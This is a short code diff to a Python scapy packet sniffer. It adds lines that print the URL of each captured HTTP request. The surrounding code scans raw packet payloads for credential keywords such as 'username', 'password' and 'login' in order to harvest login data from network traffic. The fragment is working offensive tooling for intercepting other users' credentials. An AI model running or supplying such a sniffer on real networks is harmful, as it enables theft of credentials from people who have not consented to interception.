@@ -10,6 +10,8 @@ def sniff(interface):
 def processSniffedPackage(packet):
     # HTTPRequest is an existing
     if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print(url)
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
             keywords = ["username", "user", "password", "pass", "login"]
